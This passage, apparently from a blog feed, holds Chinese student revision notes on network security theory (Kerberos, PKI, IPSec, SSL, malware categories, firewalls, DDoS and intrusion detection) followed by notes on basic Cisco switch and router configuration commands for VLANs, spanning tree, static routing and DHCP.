数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程——CISCO设备基本语法</title>
      <link href="/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="网络工程-cisco设备基本语法">网络工程——CISCO设备基本语法</h2><p>[TOC]</p><h3 id="交换机配置：">交换机配置：</h3><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span><span class="token operator">></span>enable进入特权模式<span class="token class-name">Switch</span><span class="token other-directive property">#configure</span> terminal进入全局配置模式<span class="token class-name">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#hostname</span> S1更改用户名<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#enable</span> password cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token literal constant">#line</span> con <span class="token number">0</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#password</span> cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#login</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token literal constant">#line</span> vty <span class="token number">0</span> <span class="token number">15</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#password</span> cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#login</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="管理配置地址：">管理配置地址：</h4><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># interface <span class="token class-name">Vlan</span> <span class="token number">1</span>进入vlan <span class="token number">1</span>的接口配置模式<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># ip address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>设置接口<span class="token constant">IP</span>地址与子网掩码<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># no shutdown开启端口<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># exit<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># ip <span class="token keyword">default</span><span class="token operator">-</span>gateway <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.1</span>配置默认网关<span class="token constant">IP</span>地址<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># end  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他交换机操作：</strong></p><blockquote><p>S1# show running-config 查看当前设备配置</p></blockquote><blockquote><p>S1# show flash 显示<em>flash</em>存储器信息以及存储器中的IOS映象文件</p></blockquote><blockquote><p>S1# show version 显示系统硬件的配置</p></blockquote><p><strong>交换机Vlan划分及信息备份</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch_A</span><span class="token other-directive property">#vlan</span> database进入vlan数据库模式<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span><span class="token other-directive property">#vlan</span> <span class="token number">20</span> name VLAN20 <span class="token class-name">Switch_A</span><span class="token other-directive property">#configure</span> terminal<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#interface</span> f0<span class="token operator">/</span><span class="token number">20</span><span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token other-directive property">#switchport</span> mode access将端口的工作模式改为access<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token other-directive property">#switchport</span> access vlan <span class="token number">20</span>指定接口所属vlan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保存配置及IOS到TFTP</strong></p><blockquote><p>Copy starup-config(or running-config)  tftp<br>copy flash tftp</p></blockquote><h4 id="stp与rstp">STP与RSTP</h4><p><strong>查看生成树</strong></p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Show spanning<span class="token operator">-</span>tree   <span class="token comment">#识别根桥、阻塞端口和转发端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>配置快速生成树：</strong></p><blockquote><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span> <span class="token punctuation">(</span>config<span class="token punctuation">)</span># spanning<span class="token operator">-</span>tree mode rapid<span class="token operator">-</span>pvst  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>可以通过什么方法查看交换机的生成树阻塞了那个端口？</strong></p><blockquote><p>可以通过Show spanning-tree指令查看</p></blockquote><ol><li>Disabled（禁用状态）：不转发数据帧，不学习MAC地址表，不参与生成树计算</li><li>Blocking（阻塞状态）；不转发数据帧，不学习MAC地址表，接收并处理BPDU，不发生BPDU</li><li>Listening（监听状态）：不转发数据帧，不学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Learning（学习状态）：不转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Forwarling（转发状态）：转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li></ol><p><strong>总结生成树中根桥的选举规则</strong></p><ul><li>选择根桥的依据是网桥ID，网桥ID是唯一的，网桥ID由网桥优先级 和 网桥的MAC地址组成,网桥ID中的MAC地址是自身交换机的MAC地址</li><li>在选择根桥的时候，是依据看哪台交换机的ID值最小，优先级小的被选择为根网桥，在优先级相同的情况下，MAC地址小的为根网桥</li></ul><p><strong>更改根桥优先级</strong></p><p>所有交换机的优先级都是默认的32768，要实现变更根桥，只要将交换机的优先级更改为小于32768，同时优先级的修改以4096为增量</p><blockquote><p>在全局配置模式下执行如下命令∶spanning-tree vlan 1 priority 4096</p></blockquote><p>这样，Switch3的优先级值就变成4097，成为了网络中最小的ID，从而成为了根桥。</p><h4 id="三层交换实现vlan间通信">三层交换实现VLAN间通信</h4><p><strong>将端口分配给VLAN</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift">config terminalinterface f0<span class="token operator">/</span><span class="token number">1</span>switchport mode accessswitchport access vlan <span class="token number">10</span><span class="token comment">//端口1分配给VLAN10</span>exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在交换机上给VLAN分配IP地址</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span><span class="token other-directive property">#config</span> terminal<span class="token class-name">Interface</span> vlan <span class="token number">10</span><span class="token class-name">Ip</span> address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">10.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token comment">//VLAN10分配IP地址</span><span class="token class-name">No</span> shutdown<span class="token class-name">Exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>三次交换机上为VLAN配置IP地址作用是什么？<ul><li><s><strong>vlan 上配IP就是真实的网关地址， 主要用于两台或者多台三层交换机之间进行通信</strong></s>（网络说法不一定可信）</li></ul></li><li>如何采用此种方法实现多个（超过两个）VLAN间路由？<ul><li>将二层交换机与三层交换机之间的接口设置为trunk模式，使得不同vlan可以经三层交换机实现路由</li></ul></li></ol><h3 id="路由器配置：">路由器配置：</h3><h4 id="路由器常用命令">路由器常用命令</h4><ul><li>Hostname#设置交换机的主机名</li><li>Show startup-config显示交换机初始化配置</li><li>Show running-config查看当前设备配置</li><li>Show flash显示<em>flash</em>存储器信息以及存储器中的IOS映象文件</li><li>Show version显示系统硬件的配置</li><li>Show interface **命令来查察接口的信息</li><li>Show controllers **查看接口的硬件信息</li></ul><ol><li><p><strong>通过实验，说明如何保存路由器的启动配置 startup-config？</strong></p><blockquote><p style="color:blue;">Router# copy running-config startup-config</p></blockquote></li><li><p><strong>若将两台路由器互联，配置完各个接口的IP地址以后，两台PC是否可以ping通，为什么？在路由器上Ping另外一台路由器的互联接口是否可ping通，为什么？</strong></p><blockquote><p style="color:blue;">不可以ping通，两台路由器之间缺少相应的路由，可以ping通，两个路由器端口直接相连。</p></blockquote></li></ol><p><strong>路由器的基本管理</strong></p><blockquote><p style="color:blue;">Router# copy running-config tftp配置文件保存</p></blockquote><blockquote><p style="color:blue;">Router# Copy tftp running-config配置文件恢复</p></blockquote><blockquote><p style="color:blue;">Router#copy flash tftp保存操作系统</p></blockquote><p><strong>配置静态路由</strong></p><blockquote><p>ip route [目的网络号] [子网掩码] [下一跳IP地址]</p></blockquote><p><strong>配置默认路由：</strong></p><blockquote><p>ip route 0.0.0.0 0.0.0.0  [下一跳IP地址]</p></blockquote><ol><li><p><strong>静态路由的下一跳可以采用接口号表示，那么可以将本实验中的静态路由或默认路由写成什么表达形式？</strong></p><ul><li>可以将下一跳IP地址更换成出接口</li><li>静态路由：ip route [目的网络号] [子网掩码] [出接口]</li><li>默认路由：ip route 0.0.0.0 0.0.0.0  [出接口]</li></ul></li><li><p><strong>根据实验和路由知识，若静态路由和默认路由同时存在的话，分组路由的过程中优先选择静态路由还是默认路由？为什么？</strong></p><ul><li>静态路由。在路由表中默认路由排在最后，同时存在静态路由与默认路由时，将优先使用静态路由</li></ul></li></ol><p><strong>配置DHCP：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ip dhcp pool <span class="token punctuation">[</span>poolname<span class="token punctuation">]</span> <span class="token operator">//</span>创建地址池，名字为poolnamenetwork <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">//</span>配置分配的网段 default<span class="token operator">-</span>router <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>   <span class="token operator">//</span>配置网关dns<span class="token operator">-</span>server <span class="token number">219.218</span><span class="token number">.18</span><span class="token number">.18</span> <span class="token operator">//</span> 配置DNS服务器的IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>PC端如何使用命令行方式释放或获取新的IP地址？（ipconfig 参数）</p><blockquote><p>ipconfig /release释放本机IP地址</p><p>ipconfig /renew，获得一个新的IP地址</p></blockquote></li><li><p>若DHCP的配置中，使用的是Network 192.168.1.0 255.255.255.0，那么R1所连接本地网络中主机获取的IP地址范围是什么？</p><ul><li>192.168.1.1到192.168.1.254 <s>（应该）</s></li></ul></li><li><p>根据实验说明：主机获取的IP地址、子网掩码、网关和DNS分别与DHCP配置中那条命令对应？</p><ul><li>network命令配置主机获取的IP地址，子网掩码，default-router配置网关，dns-server配置DNS域名解析服务器。</li></ul></li></ol><p><strong>查看DHCP状态:</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">R1#show ip dhcp binding  &#x2F;&#x2F; 查看IP分配绑定状态R1#show ip dhcp pool [poolname]   &#x2F;&#x2F; 查看dhcp地址池R1#show ip dhcp server statistics &#x2F;&#x2F; 查看dhcp服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二层交换机与路由器实现vlan间路由">二层交换机与路由器实现VLAN间路由</h4><p><strong>在交换机上创建Trunk端口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface f0&#x2F;1                       &#x2F;&#x2F;与路由器级联接口为f0&#x2F;1switchport mode trunk       &#x2F;&#x2F;封装为Trunk口end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>配置路由器子接口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Router#configure terminalInterface f0&#x2F;0No shutexitInterface f0&#x2F;0.10Encapsulation dot1q 10    &#x2F;&#x2F;子接口1对应VLAN 10Ip address 192.168.10.1 255.255.255.0Interface f0&#x2F;0.20Encapsulation dot1q 20Ip address 192.168.20.1 255.255.255.0    &#x2F;&#x2F;子接口2 对应VLAN 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>激活路由选择协议</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Switch(config)#Ip routing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>使用这种方式配置VLAN间路由的原理是什么？</p><p>路由器的一个接口上通过配置逻辑接口或子接口的方式，<code>实现原来相互隔离的不同VLAN（虚拟局域网）之间的互联互通</code></p></li><li><p>如果不使用子接口，而是利用路由器的两个以太网口分别连接到交换机两个不同VLAN中的接口上（PC、交换机与路由器级联接口也划分入相应的VLAN），是否能够连通？在这种情况下，路由器与交换机之间的级联接口不配置Trunk是否可以连通？</p><ul><li>可以连通， 